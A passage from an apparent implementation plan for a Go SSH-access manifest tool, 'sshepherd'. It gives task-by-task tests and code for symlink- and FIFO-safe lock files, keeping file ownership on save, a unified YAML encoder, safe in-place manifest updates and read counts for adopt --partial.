// lock takes an exclusive, non-blocking flock on the manifest's persistent
// sidecar. The sidecar is opened without following a symlink (O_NOFOLLOW) and
// without blocking on a planted FIFO (O_NONBLOCK), and must be a regular file
// owned by this euid or by the manifest's owner (so `sudo` on your own
// manifest still works); anything else is refused, never created through.
func lock(resolved string) (func(), error) {
	path := LockPath(resolved)
	f, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE|syscall.O_NOFOLLOW|syscall.O_NONBLOCK, 0o600) // #nosec G304 -- sidecar next to the user's own manifest
	if err != nil {
		if errors.Is(err, syscall.ELOOP) {
			return nil, fmt.Errorf("lock manifest: %s is a symlink; refusing to follow it — remove it and re-run", path)
		}
		return nil, fmt.Errorf("lock manifest: %w", err)
	}
	if err := checkLockFile(f, path, resolved); err != nil {
		_ = f.Close()
		return nil, err
	}
	// flock + unlock closure unchanged from edit_lock_unix.go:21-31 (ErrLocked on EWOULDBLOCK)
	…
}

func checkLockFile(f *os.File, path, resolved string) error {
	fi, err := f.Stat()
	if err != nil {
		return fmt.Errorf("lock manifest %s: %w", path, err)
	}
	if !fi.Mode().IsRegular() {
		return fmt.Errorf("lock manifest: %s is not a regular file — remove it and re-run", path)
	}
	uid, _, ok := ownerOf(fi)
	if !ok || uid == geteuid() {
		return nil
	}
	if mi, err := os.Stat(resolved); err == nil {
		if muid, _, ok := ownerOf(mi); ok && muid == uid {
			return nil
		}
	}
	return fmt.Errorf("lock manifest: %s is owned by uid %d, not by you (uid %d) or the manifest's owner — remove it and re-run", path, uid, geteuid())
}
```

  Note: the finding asks for "owned by the current uid". We add the manifest-owner fallback because `sudo sshepherd revoke` on a manifest whose lock you created earlier would otherwise be refused. It does not weaken the threat model. An attacker who owns the manifest already controls it, and a third-uid lock (the SEC-7 attack) is still refused. Today a lock owned by another non-root user already fails with EACCES (it is mode 0600), so no shared-manifest workflow regresses.

- [ ] **Step 4: Run, expect PASS:** `go test -race ./internal/manifest/ -run 'TestStore'`

---

#### Task 3 (TST-8): `keepOwner` compares with the temp file, not the process; coverage of the chown paths

**Files:** `internal/manifest/store_unix.go`, `internal/manifest/store_test.go`.

- [ ] **Step 1: Failing tests.** Group helper and three cases:

```go
// otherGroup returns a supplementary group of this process other than its
// egid, or skips: chgrp to it needs no root.
func otherGroup(t *testing.T) int {
	t.Helper()
	gs, err := os.Getgroups()
	if err != nil {
		t.Skipf("getgroups: %v", err)
	}
	for _, g := range gs {
		if g != os.Getegid() {
			return g
		}
	}
	t.Skip("runner has no supplementary group; keepOwner chgrp path not testable without root")
	return 0
}

func gidOf(t *testing.T, path string) int {
	t.Helper()
	fi, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	_, gid, _ := ownerOf(fi)
	return gid
}

// (a) A manifest chgrp'd to a supplementary group keeps that gid on Save.
func TestStoreSaveKeepsGroup(t *testing.T) {
	g := otherGroup(t)
	s := readTemp(t, "users: []\n")
	if err := os.Chown(s.Resolved, -1, g); err != nil {
		t.Fatal(err)
	}
	if err := s.Save([]byte("users: []\n# x\n")); err != nil {
		t.Fatalf("Save: %v", err)
	}
	if got := gidOf(t, s.Resolved); got != g {
		t.Errorf("gid = %d, want %d kept", got, g)
	}
}

// (b) The directory hands new files a different group (BSD inheritance on
// darwin; a setgid directory on Linux) while the manifest has the process's
// own egid: today keepOwner skips (orig == process ids) and the gid silently
// changes. FAILS before the fix.
func TestStoreSaveKeepsGroupUnderDirInheritance(t *testing.T) {
	g := otherGroup(t)
	dir := t.TempDir()
	if err := os.Chown(dir, -1, g); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(dir, 0o2700); err != nil { // setgid: Linux inherits like BSD
		t.Fatal(err)
	}
	p := filepath.Join(dir, "sshepherd.yaml")
	if err := os.WriteFile(p, []byte("users: []\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Chown(p, -1, os.Getegid()); err != nil {
		t.Fatal(err)
	}
	s, err := Read(p)
	if err != nil {
		t.Fatal(err)
	}
	if err := s.Save([]byte("users: []\n# x\n")); err != nil {
		t.Fatalf("Save: %v", err)
	}
	if got := gidOf(t, p); got != os.Getegid() {
		t.Errorf("gid = %d, want the manifest's %d kept (dir group %d leaked in)", got, os.Getegid(), g)
	}
}

// (c) A failing chown refuses the save before the rename: manifest untouched,
// no temp file left.
func TestStoreSaveChownFailureRefuses(t *testing.T) {
	g := otherGroup(t)
	s := readTemp(t, "users: []\n")
	if err := os.Chown(s.Resolved, -1, g); err != nil {
		t.Fatal(err)
	}
	saved := chown
	chown = func(*os.File, int, int) error { return syscall.EPERM }
	t.Cleanup(func() { chown = saved })
	err := s.Save([]byte("users: []\n# x\n"))
	if err == nil || !strings.Contains(err.Error(), "would change the manifest's owner") {
		t.Fatalf("Save = %v, want the owner refusal", err)
	}
	if got, _ := os.ReadFile(s.Path); string(got) != "users: []\n" {
		t.Errorf("manifest changed: %q", got)
	}
	entries, _ := os.ReadDir(filepath.Dir(s.Resolved))
	for _, e := range entries {
		if strings.Contains(e.Name(), ".tmp-") {
			t.Errorf("temp file left behind: %s", e.Name())
		}
	}
}
```

- [ ] **Step 2: Run, expect FAIL:** `go test ./internal/manifest/ -run 'TestStoreSaveKeepsGroup|TestStoreSaveChown'`. (b) fails with the dir group leaking in, and (c) fails because `chown` is undefined. On a runner with no supplementary group all three skip. Record that in the integrator's report, because GitHub `ubuntu-latest` has `adm`/`docker`, so CI does exercise them.

- [ ] **Step 3: Implement:**

```go
// chown is (*os.File).Chown, swappable to force the refusal path in tests.
var chown = (*os.File).Chown

// keepOwner gives tmp the original manifest's uid/gid whenever tmp did not
// get them already (process ids, BSD/setgid directory inheritance); a failed
// chown refuses the save before the rename rather than silently changing the
// manifest's owner.
func keepOwner(tmp *os.File, orig fs.FileInfo) error {
	uid, gid, ok := ownerOf(orig)
	if !ok {
		return nil
	}
	ti, err := tmp.Stat()
	if err != nil {
		return fmt.Errorf("stat temp file: %w", err)
	}
	if tuid, tgid, ok := ownerOf(ti); ok && tuid == uid && tgid == gid {
		return nil
	}
	if err := chown(tmp, uid, gid); err != nil {
		return fmt.Errorf("would change the manifest's owner (%d:%d): %w", uid, gid, err)
	}
	return nil
}
```

  This adds no new refusal in practice. Before, the process-id comparison chowned whenever the original differed from the process ids. Now we also chown when the temp file's inherited group differs from an original group that the process itself owns, and that chown always succeeds.

- [ ] **Step 4: Run, expect PASS:** `go test -race -cover ./internal/manifest/` (expect `keepOwner` at 100% where a supplementary group exists).

---

#### Task 4 (ARC-6a): one encoder from the config types

**Files:** `internal/manifest/manifest.go`, `internal/manifest/manifest_test.go`, `internal/manifest/fuzz_test.go`.

- [ ] **Step 1: Failing tests** in `manifest_test.go`:

```go
// Generate's omitempty contract: required keys always present, optional zero
// fields and the default port (0 or 22) omitted, field order = struct order.
func TestGenerateOmitEmpty(t *testing.T) {
	k := testkeys.Line(t, 1)
	got, err := Generate("# hdr\n",
		[]config.User{{Name: "a", Keys: []string{k}}, {Name: "op", Operator: true, Keys: []string{k}}},
		[]config.Server{{Name: "w", Host: "h", Port: 22, User: "u"}, {Name: "d", Host: "h2", Port: 2222, User: "u", AuthorizedKeysFile: "~/.ssh/ak"}},
		[]config.Access{{User: "a", Servers: []string{"*"}, Except: []string{"d"}}, {User: "a", Servers: []string{"w"}, Except: []string{}}})
	if err != nil {
		t.Fatal(err)
	}
	want := "# hdr\nusers:\n  - name: a\n    keys:\n      - " + k + "\n  - name: op\n    operator: true\n    keys:\n      - " + k +
		"\nservers:\n  - name: w\n    host: h\n    user: u\n  - name: d\n    host: h2\n    port: 2222\n    user: u\n    authorized_keys_file: ~/.ssh/ak\n" +
		"access:\n  - user: a\n    servers:\n      - '*'\n    except:\n      - d\n  - user: a\n    servers:\n      - w\n"
	if string(got) != want {
		t.Errorf("Generate =\n%s\nwant\n%s", got, want)
	}
}

// Empty sections render as `users: []` exactly like the old struct encoder.
func TestGenerateEmptySections(t *testing.T) {
	got, err := Generate("", nil, nil, nil)
	if err != nil || string(got) != "users: []\nservers: []\naccess: []\n" {
		t.Fatalf("Generate(empty) = %q, %v", got, err)
	}
}
```

Migrate every `Append` call site in `manifest_test.go` (lines 67-75 `carolEntry`, 159-164, 205-209, 253-254, 287-289, 348-350, 381, 404) and `fuzz_test.go:85-89` to `config.User/Server/Access`. Add one Append test: an appended server with `Description` and `AuthorizedKeysFile` renders both. Today's `ServerEntry` cannot carry them (manifest.go:58-66).

- [ ] **Step 2: Run, expect FAIL** (`undefined: Generate`, and `Append` arguments have the wrong type): `go test ./internal/manifest/`

- [ ] **Step 3: Implement** in `manifest.go`. Delete `UserEntry/ServerEntry/AccessEntry` (47-74) and `userNode/serverNode/accessNode` (340-379). Add:

```go
// requiredKeys are emitted even at their zero value (the loader requires
// them); every other field is omitempty. A new config field is therefore
// emitted by adopt, import and Append with no change here — and
// cmd/sshepherd/schema_roundtrip_test.go fails until it round-trips.
var requiredKeys = map[string]bool{"name": true, "host": true, "user": true, "keys": true, "servers": true}

// entryNode renders one config.User/Server/Access as a mapping in struct
// field order, from the yaml tags: required keys always, optional fields only
// when non-zero (an empty slice counts as zero), and port omitted at 0 or 22
// (validation defaults 0 to 22, so both spell the default).
func entryNode(v any) (*yaml.Node, error) {
	rv := reflect.ValueOf(v)
	rt := rv.Type()
	n := &yaml.Node{Kind: yaml.MappingNode, Tag: "!!map"}
	for i := range rt.NumField() {
		f := rt.Field(i)
		key, _, _ := strings.Cut(f.Tag.Get("yaml"), ",")
		if !f.IsExported() || key == "" || key == "-" {
			continue
		}
		fv := rv.Field(i)
		empty := fv.IsZero() || (fv.Kind() == reflect.Slice && fv.Len() == 0)
		if key == "port" && (fv.Int() == 0 || fv.Int() == 22) {
			empty = true
		}
		if empty && !requiredKeys[key] {
			continue
		}
		val := &yaml.Node{}
		if err := val.Encode(fv.Interface()); err != nil {
			return nil, fmt.Errorf("encode %s.%s: %w", rt.Name(), key, err)
		}
		n.Content = append(n.Content, strScalar(key), val)
	}
	return n, nil
}

func entryNodes[T any](items []T) ([]*yaml.Node, error) {
	out := make([]*yaml.Node, 0, len(items))
	for _, it := range items {
		n, err := entryNode(it)
		if err != nil {
			return nil, err
		}
		out = append(out, n)
	}
	return out, nil
}

// Generate renders a fresh manifest — header (raw comment lines with their
// own "#" and trailing newline) then users, servers, access — with the same
// encoder settings as Encode (2-space indent). It is the one renderer for
// adopt's and import's generated drafts.
func Generate(header string, users []config.User, servers []config.Server, access []config.Access) ([]byte, error) {
	root := &yaml.Node{Kind: yaml.MappingNode, Tag: "!!map"}
	for _, sec := range []struct {
		key   string
		items func() ([]*yaml.Node, error)
	}{
		{"users", func() ([]*yaml.Node, error) { return entryNodes(users) }},
		{"servers", func() ([]*yaml.Node, error) { return entryNodes(servers) }},
		{"access", func() ([]*yaml.Node, error) { return entryNodes(access) }},
	} {
		items, err := sec.items()
		if err != nil {
			return nil, err
		}
		root.Content = append(root.Content, strScalar(sec.key), &yaml.Node{Kind: yaml.SequenceNode, Tag: "!!seq", Content: items})
	}
	var buf bytes.Buffer
	buf.WriteString(header)
	enc := yaml.NewEncoder(&buf)
	enc.SetIndent(2)
	if err := enc.Encode(&yaml.Node{Kind: yaml.DocumentNode, Content: []*yaml.Node{root}}); err != nil {
		return nil, fmt.Errorf("encode manifest: %w", err)
	}
	if err := enc.Close(); err != nil {
		return nil, fmt.Errorf("encode manifest: %w", err)
	}
	return buf.Bytes(), nil
}
```

`Append` keeps its comment and section logic (209-239), but builds its nodes with `entryNodes(users/servers/access)`. Update the package doc (lines 6-7) and the `Append` doc to say it takes config types. The old note that "Appends never carry except:" (68-70) is removed. An `Except` given by a caller is now rendered, and that is harmless: no caller sets it, and Encode's `config.Parse` self-check still validates.

  Empty-sequence rendering: libyaml emits an empty block sequence as `[]`, and `TestGenerateEmptySections` pins it. If it ever does not, set `Style: yaml.FlowStyle` when `len(items) == 0`.

- [ ] **Step 4: Run, expect PASS:** `go test -race ./internal/manifest/` and `go test -run XXX -fuzz '^FuzzMergeRoundTrip$' -fuzztime 20s ./internal/manifest/` and `go test -run XXX -fuzz '^FuzzManifestEdit$' -fuzztime 20s ./internal/manifest/` (the real targets: `fuzz_test.go:17`, `fuzz_edit_test.go:17`). Keep the seed corpus untouched.

---

#### Task 5 (ARC-1b): cmd adapter; delete the cmd lock files

**Files:** `cmd/sshepherd/edit.go` (replace lines 53-167 only), delete `edit_lock_unix.go` and `edit_lock_other.go`, `edit_save_test.go`, `edit_test.go`.

- [ ] **Step 1: Test.** Reduce `edit_save_test.go` to the one cmd-level contract that the adapter owns: the seam fires on a regular file and never on a stream. Delete the tests ported in Task 1. Delete `edit_test.go`'s `TestReadManifestAndUnchanged`, which now lives in store_test, or keep it as a 5-line adapter smoke test.

```go
func TestManifestTargetSeamFires(t *testing.T) {
	m, err := readManifest(writeConfig(t, "users: []\n"))
	if err != nil {
		t.Fatal(err)
	}
	fired := false
	saved := beforeManifestSave
	beforeManifestSave = func(manifestTarget) { fired = true }
	t.Cleanup(func() { beforeManifestSave = saved })
	if err := m.Save([]byte("users: []\n# x\n")); err != nil || !fired {
		t.Fatalf("Save = %v, seam fired = %v; want nil, true", err, fired)
	}
	if !errors.Is(errManifestLocked, manifest.ErrLocked) {
		t.Error("errManifestLocked must be manifest.ErrLocked")
	}
}
```

- [ ] **Step 2: Run, expect FAIL** to compile (`manifest.ErrLocked` undefined until Stream A lands, then the duplicate `lockManifest` clashes): `go test ./cmd/sshepherd/ -run TestManifestTarget`

- [ ] **Step 3: Implement** the adapter in edit.go:

```go
// manifestTarget is the manifest as a run read it (manifest.Store: path,
// resolved file, exact bytes, stream flag) plus this package's test seam.
// apply, revoke, rotate, and adopt/import in-place output all save through it.
type manifestTarget struct{ manifest.Store }

func readManifest(path string) (manifestTarget, error) {
	s, err := manifest.Read(path)
	if err != nil {
		return manifestTarget{}, err //nolint:wrapcheck // Store errors already read "read manifest: …"; a prefix would stutter
	}
	return manifestTarget{s}, nil
}

// beforeManifestSave is a test seam: it runs at the start of Save on a
// regular file, before the lock and the compare-and-swap.
var beforeManifestSave = func(manifestTarget) {}

func (m manifestTarget) Save(data []byte) error {
	if !m.Stream {
		beforeManifestSave(m)
	}
	return m.Store.Save(data) //nolint:wrapcheck // "save manifest PATH: …" / "changed since it was read" are the user-facing text
}

// errManifestLocked is returned when another run holds the manifest lock.
var errManifestLocked = manifest.ErrLocked
```

`git rm cmd/sshepherd/edit_lock_unix.go cmd/sshepherd/edit_lock_other.go`. Drop the now-unused `bytes`, `io` and `path/filepath` imports from edit.go if P06 left nothing else using them.

- [ ] **Step 4: Run, expect PASS. This step is the regression net for the move:** `go test -race ./cmd/sshepherd/`. Every revoke/rotate/apply test, `TestRevokeCASConflict` (revoke_test.go:295), `json_cmd_test.go:401` and `edit_stream_test.go` must stay green untouched.

---

#### Task 6 (ARC-1c): in-place `-o` goes through the store

**Files:** `cmd/sshepherd/manifest_out.go`, `manifest_out_test.go`, `adopt.go`, `adopt_test.go`, `import.go`, `import_merge_test.go`.

- [ ] **Step 1: Failing tests.**

```go
// import_merge_test.go — a revoke saved while the merge runs must survive:
// the in-place write is refused (exit 3) instead of restoring the old copy.
func TestImportMergeInPlaceKeepsConcurrentRevoke(t *testing.T) {
	hermeticHome(t)
	m := writeMergeManifest(t)
	cfg := writeSSHConfig(t, "Host app-1\n  HostName 10.0.0.5\n  User deploy\n")
	revoked := []byte("users: []\nservers: []\naccess: []\n# revoked meanwhile\n")
	saved := beforeManifestSave
	beforeManifestSave = func(mt manifestTarget) {
		if err := os.WriteFile(mt.Resolved, revoked, 0o600); err != nil {
			t.Error(err)
		}
	}
	t.Cleanup(func() { beforeManifestSave = saved })
	var out, errBuf bytes.Buffer
	code := run([]string{"import", cfg, "--merge", m, "--servers-only", "-o", m, "--force"}, &out, &errBuf)
	if code != 3 || !strings.Contains(errBuf.String(), "changed since it was read; re-run") {
		t.Fatalf("exit = %d, stderr = %q; want 3 and the changed-since-read refusal", code, errBuf.String())
	}
	if got, _ := os.ReadFile(m); !bytes.Equal(got, revoked) {
		t.Errorf("manifest = %q, want the concurrent revoke kept", got)
	}
}

// In-place merge keeps a group-readable mode (was forced to 0600).
func TestImportMergeInPlaceKeepsMode(t *testing.T) {
	hermeticHome(t)
	m := writeMergeManifest(t)
	if err := os.Chmod(m, 0o640); err != nil { // #nosec G302 -- a group-shared manifest under test
		t.Fatal(err)
	}
	cfg := writeSSHConfig(t, "Host app-1\n  HostName 10.0.0.5\n  User deploy\n")
	var out, errBuf bytes.Buffer
	if code := run([]string{"import", cfg, "--merge", m, "--servers-only", "-o", m, "--force"}, &out, &errBuf); code != 0 {
		t.Fatalf("exit = %d, stderr = %q", code, errBuf.String())
	}
	st, err := os.Stat(m)
	if err != nil {
		t.Fatal(err)
	}
	if st.Mode().Perm() != 0o640 {
		t.Errorf("mode = %o, want 0640 kept (was forced to 0600)", st.Mode().Perm())
	}
	resolved, err := filepath.EvalSymlinks(m)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(manifest.LockPath(resolved)); err != nil {
		t.Errorf("lock sidecar %s missing: the in-place write did not go through the store (%v)", manifest.LockPath(resolved), err)
	}
}

// adopt regenerate in place: an empty fleet needs no SSH; the generated
// header makes the bytes differ, so Save runs and the seam can race it.
func TestAdoptInPlaceKeepsConcurrentRevoke(t *testing.T) {
	t.Setenv("SSH_AUTH_SOCK", "")
	cfg := writeConfig(t, "users: []\nservers: []\naccess: []\n")
	revoked := []byte("users: []\nservers: []\naccess: []\n# revoked meanwhile\n")
	saved := beforeManifestSave
	beforeManifestSave = func(mt manifestTarget) {
		if err := os.WriteFile(mt.Resolved, revoked, 0o600); err != nil {
			t.Error(err)
		}
	}
	t.Cleanup(func() { beforeManifestSave = saved })
	var out, errBuf bytes.Buffer
	code := run([]string{"adopt", "--config", cfg, "-o", cfg, "--force"}, &out, &errBuf)
	if code != 3 || !strings.Contains(errBuf.String(), "changed since it was read; re-run") {
		t.Fatalf("exit = %d, stderr = %q; want 3 and the changed-since-read refusal", code, errBuf.String())
	}
	if got, _ := os.ReadFile(cfg); !bytes.Equal(got, revoked) {
		t.Errorf("manifest = %q, want the concurrent revoke kept", got)
	}
}

// A different existing -o keeps today's no-clobber contract and 0600.
// (TestAdoptOutputFileNoClobber, adopt_test.go:420, already covers it — leave unchanged.)
```

Update `TestImportMergeInPlaceForce` (import_merge_test.go:242-279). The no-`--force` refusal now reads `M is the manifest this run read; pass --force to update it in place`. The existing `strings.Contains(…, "--force")` assertion still holds, so only extend the doc comment. Also add a no-op case: re-running the same in-place merge a second time writes nothing (the mtime is unchanged and no temp file is left).

- [ ] **Step 2: Run, expect FAIL:** `go test ./cmd/sshepherd/ -run 'InPlace'`. Today the merge overwrites the concurrent edit (exit 0) and chmods the file to 0600.

- [ ] **Step 3: Implement.**
  - a. **adopt.go:** read the manifest **once through `readManifest(cfgPath)`** in both modes. For `--merge`, P06 may already have done this (`manifest.Load(m.Loaded)`). For regenerate, replace `config.Load(cfgPath)` with `config.Parse(m.Loaded)`, keeping P06's `manifestError` wrapping. Keep `m` (a `manifestTarget`) in scope until the write.
  - b. **import.go `loadMergeTarget`** (213-228): `m, err := readManifest(path)`, then `manifest.Load(m.Loaded)`. Return `(manifestTarget, *manifest.File, error)`, and the caller uses `m.Loaded` as `raw`. When `--merge` is not given, `m` stays the zero `manifestTarget{}`.
  - c. **manifest_out.go:** delete everything from line 15 to the end (types, encoder, writer, helpers, now in internal/manifest) and add:

```go
// publishManifest writes a generated manifest to -o. When out is the very
// file this run read (adopt's --config, adopt/import --merge; symlinks
// followed) it is an in-place update: --force is still required, identical
// bytes write nothing, and the write goes through Save — the manifest lock,
// the changed-since-read refusal, the file's own mode and owner — so it can
// never undo a concurrent revoke. Any other path is a new file
// (manifest.WriteFile: mode 0600, never clobbered without --force).
func publishManifest(src manifestTarget, out string, data []byte, force bool) error {
	same, err := src.SameAs(out)
	if err != nil {
		return err //nolint:wrapcheck // SameAs names both paths
	}
	if !same {
		return manifest.WriteFile(out, data, force) //nolint:wrapcheck // "write PATH: …" / "--force" hints are the user-facing text
	}
	if !force {
		return fmt.Errorf("%s is the manifest this run read; pass --force to update it in place", out)
	}
	if bytes.Equal(data, src.Loaded) {
		return nil
	}
	return src.Save(data)
}
```

  - d. Replace `writeFileNoClobber(outPath, rendered, force)` at adopt.go:314 and import.go:425 with `publishManifest(m, outPath, rendered, force)`.
  - e. **manifest_out_test.go:** delete the four `TestWriteFileNoClobber*` tests (moved in Task 1) and `TestEncodeManifestExceptRoundTrip` (16-52, superseded by Task 4 + Task 7). Add `TestPublishManifestRoutes`, a table test for: new path → created 0600; other existing path without force → `already exists; pass --force`; same path without force → `pass --force to update it in place`; same path, force, identical bytes → no write (mtime unchanged); same path, force, new bytes → saved, mode kept.
  - f. Update the import.go comment at 386-390 ("the early full read is what makes in-place … safe") to: "the store read is what lets an in-place `-o FILE --force` refuse a concurrent change."

- [ ] **Step 4: Run, expect PASS:** `go test -race ./cmd/sshepherd/ -run 'InPlace|Publish|NoClobber|Merge|Adopt|Import'`

---

#### Task 7 (ARC-6b): adopt and import use the one encoder; reflection round-trip

**Files:** `cmd/sshepherd/adopt.go`, `import.go`, `schema_roundtrip_test.go` (new), goldens.

- [ ] **Step 1: Failing test** `cmd/sshepherd/schema_roundtrip_test.go`:

```go
package main

// samples holds a valid, non-zero value for every exported yaml field of the
// manifest types. A field without a sample fails the test: adding a schema
// field forces proving that adopt (regenerate) and Append (adopt/import
// --merge) carry it.
func samples(t *testing.T) map[string]map[string]any {
	k := testkeys.Line(t, 1)
	return map[string]map[string]any{
		"User":   {"Name": "op", "Description": "d", "Comment": "c", "Operator": true, "Keys": []string{k}},
		"Server": {"Name": "web-1", "Description": "d", "Host": "10.0.0.1", "Port": 2222, "User": "deploy", "AuthorizedKeysFile": "/etc/ssh/keys/deploy"},
		"Access": {"User": "bob", "Servers": []string{"*"}, "Except": []string{"web-1"}},
	}
}

func fill[T any](t *testing.T, s map[string]map[string]any) T {
	t.Helper()
	var v T
	rv := reflect.ValueOf(&v).Elem()
	name := rv.Type().Name()
	for i := range rv.NumField() {
		f := rv.Type().Field(i)
		if !f.IsExported() || f.Tag.Get("yaml") == "-" {
			continue
		}
		val, ok := s[name][f.Name]
		if !ok {
			t.Fatalf("config.%s.%s has no sample in schema_roundtrip_test.go — add one so adopt/import/Append are proven to carry it", name, f.Name)
		}
		rv.Field(i).Set(reflect.ValueOf(val))
	}
	return v
}

func roundTripConfig(t *testing.T) (*config.Config, config.User, config.Server, config.Access) {
	s := samples(t)
	u, srv, a := fill[config.User](t, s), fill[config.Server](t, s), fill[config.Access](t, s)
	cfg := &config.Config{
		Users:   []config.User{u, {Name: "bob", Keys: []string{testkeys.Line(t, 2)}}},
		Servers: []config.Server{srv, {Name: "web-2", Host: "10.0.0.2", User: "deploy"}},
		Access:  []config.Access{a},
	}
	return cfg, u, srv, a
}

func TestSchemaRoundTripAdopt(t *testing.T) {
	cfg, u, srv, a := roundTripConfig(t)
	out, err := generateAdoptManifest(cfg, adopt.Plan{}, "rt.yaml", nil)
	if err != nil {
		t.Fatal(err)
	}
	got, err := config.Parse(out)
	if err != nil {
		t.Fatalf("adopt output does not load: %v\n%s", err, out)
	}
	if !reflect.DeepEqual(got.Users[0], u) || !reflect.DeepEqual(got.Servers[0], srv) || !reflect.DeepEqual(got.Access[0], a) {
		t.Errorf("config → adopt → config lost a field:\n%s", out)
	}
}

func TestSchemaRoundTripAppend(t *testing.T) {
	cfg, u, srv, a := roundTripConfig(t)
	mf, err := manifest.Load([]byte("users: []\nservers: []\naccess: []\n"))
	if err != nil {
		t.Fatal(err)
	}
	if err := mf.Append([]string{"rt"}, cfg.Users, cfg.Servers, cfg.Access); err != nil {
		t.Fatal(err)
	}
	out, err := mf.Encode()
	/* same Parse + DeepEqual assertions as above */
}
```

  (`reflect.DeepEqual` on `config.User/Server/Access` compares exported fields only, because those types have no unexported fields. `Config`'s private maps are never compared.)

- [ ] **Step 2: Run, expect FAIL:** `go test ./cmd/sshepherd/ -run TestSchemaRoundTrip`. `TestSchemaRoundTripAppend` fails to compile until Task 4 lands, and the adopt half passes today. Then **mutation-check the guard**: temporarily delete `AuthorizedKeysFile` from the `serverOut` copy in adopt.go:41-44 and confirm the adopt half FAILS. Revert.

- [ ] **Step 3: Implement.**
  - `generateAdoptManifest` (adopt.go:25-69) becomes:

```go
users := append(slices.Clone(cfg.Users), newUsers(plan)...)
access := append(slices.Clone(cfg.Access), extensionsAndGrants(plan)...)
return manifest.Generate(header.String(), users, cfg.Servers, access) //nolint:wrapcheck // "encode manifest: …"
```

    The shared helpers `newUsers(plan) []config.User` (description `adopted from …`, `Keys: []string{nu.Line}`) and `extensionsAndGrants(plan) []config.Access` (extensions, then new users' grants with the existing `nu.Wildcard → ["*"]` rule, untouched here because D5 is a separate decision) are used by both `generateAdoptManifest` and `renderMergedManifest` (79-114), which then calls `mf.Append(comments, newUsers(plan), nil, extensionsAndGrants(plan))`. Port: `cfg.Servers` carry the validated `22`, and `entryNode` omits it, matching today's `s.Port != 22` (adopt.go:45).
  - `generateManifest` (import.go:63-121) builds `[]config.Server{Name: h.Alias, Host: h.HostName, Port: h.Port, User: h.User}` (the encoder omits 0 and 22), `[]config.User{…}` and `[]config.Access{…}` with the same notes and wildcard logic, then calls `manifest.Generate`.
  - `renderMergedImport` (import.go:277-311) converts `reconcile.UserAdd/ServerAdd/Extension/Grant` to config types (`ServerAdd.Port` 0 stays 0) and calls `mf.Append`.
  - Nothing in cmd references `userOut/serverOut/accessOut/manifestOut/encodeManifest` any more, and they were already deleted in Task 6c.

- [ ] **Step 4: Run, expect PASS with goldens UNCHANGED:** `go test -race ./cmd/sshepherd/ -run 'Golden|SchemaRoundTrip|Adopt|Import'`, **without `-update`**. All 9 goldens (`adopt_merge`, `adopt_mixed`, `adopt_noop`, `adopt_partial`, `import_manifest`, `import_manifest_operators`, `import_manifest_users`, `import_merge`, `import_merge_servers_only`) must pass byte-for-byte. The field order and quoting match today's encoder (compare `adopt_mixed.golden`). Only if a diff appears: run with `-update`, read the `git diff testdata/` by eye, and accept it only if it is a pure normalization that the README does not quote. Otherwise fix `entryNode`.

---

#### Task 8 (UX-4): honest `adopt --partial`

**Files:** `cmd/sshepherd/adopt.go`, `adopt_test.go`, `testdata/help/adopt.golden`.

- [ ] **Step 0: Reproduce first.** The findings file holds UX-2's verifier text under UX-4. Add the Step 1 test before changing anything and record the observed failure in the task report: `--partial exit = 0, want 3`, with stderr showing `0 read, 1 unreachable` and `nothing to adopt … on the readable servers`.

- [ ] **Step 1: Failing tests** (adopt_test.go):

```go
// Every server unreadable: --partial refuses (exit 3), nothing on stdout.
func TestAdoptPartialNothingRead(t *testing.T) {
	path, kh := unreachableFleet(t)
	var out, errBuf bytes.Buffer
	code := run([]string{"adopt", "--config", path, "--known-hosts", kh, "--partial"}, &out, &errBuf)
	if code != 3 {
		t.Fatalf("exit = %d, want 3 (stderr: %s)", code, errBuf.String())
	}
	if out.Len() != 0 {
		t.Errorf("stdout = %q, want no manifest when nothing was read", out.String())
	}
	if !strings.Contains(errBuf.String(), "read 0 of 1 server — nothing could be adopted") {
		t.Errorf("stderr = %q, want the zero-read refusal", errBuf.String())
	}
}

// One of two read: the manifest is written with the gap marked and stderr
// says "read 1 of 2 servers". Exit 0 (D8 unanswered) or 1 (D8 = option 1).
func TestAdoptPartialSomeRead(t *testing.T) {
	hosts, kh, _ := editFleet(t, []byte{1}, "web-1")
	hosts["web-1"].install(t, []byte{1})
	cfg := writeConfig(t, "users:\n  - {name: alice, keys: ["+qk(t, 1)+"]}\nservers:\n"+hosts["web-1"].line("web-1")+
		"  - {name: web-2, host: 127.0.0.1, port: "+strconv.Itoa(closedPort(t))+", user: deploy}\naccess:\n  - {user: alice, servers: [web-1]}\n")
	var out, errBuf bytes.Buffer
	code := run([]string{"adopt", "--config", cfg, "--known-hosts", kh, "--partial"}, &out, &errBuf)
	if code != adoptPartialExit {
		t.Fatalf("exit = %d, want %d (stderr: %s)", code, adoptPartialExit, errBuf.String())
	}
	if !strings.Contains(errBuf.String(), "read 1 of 2 servers") ||
		!strings.Contains(out.String(), "# WARNING: server web-2 unreadable") {
		t.Errorf("stderr = %q / stdout = %q, want the read count and the gap marker", errBuf.String(), out.String())
	}
}
```

Update the `--partial` half of `TestAdoptUnreachableStrictGateAndPartial` (adopt_test.go:550-566). With its single unreachable server it is now a zero-read, so assert exit 3 and drop the `on the readable servers` assertion, which moves to `TestAdoptPartialSomeRead`. The strict half (exit 1) is unchanged. Add a full-read assertion to an existing all-reachable adopt test: stderr contains `read 1 of 1 server`.

- [ ] **Step 2: Run, expect FAIL:** `go test ./cmd/sshepherd/ -run 'TestAdoptPartial|TestAdoptUnreachable'`

- [ ] **Step 3a: Implement (always).** In `newAdoptCmd` RunE, after `plan := adopt.Build(cfg, results)` and the `reportUnreadable` gate:

```go
// fleetReadCount counts servers whose read returned without a transport
// error (a server with only an ignored line still counts as read: its other
// keys were seen).
func fleetReadCount(results []audit.ServerResult) int {
	n := 0
	for _, r := range results {
		if r.Err == nil {
			n++
		}
	}
	return n
}
```

```go
total, read := len(cfg.Servers), fleetReadCount(results)
if total > 0 {
	msg := "read " + strconv.Itoa(read) + " of " + apply.Plural(total, "server", "servers")
	if read < total {
		log.Warn(msg + " — access on the others is NOT in the output")
	} else {
		log.Info(msg)
	}
}
if partial && total > 0 && read == 0 {
	return fmt.Errorf("read 0 of %s — nothing could be adopted; fix the errors above", apply.Plural(total, "server", "servers"))
}
```

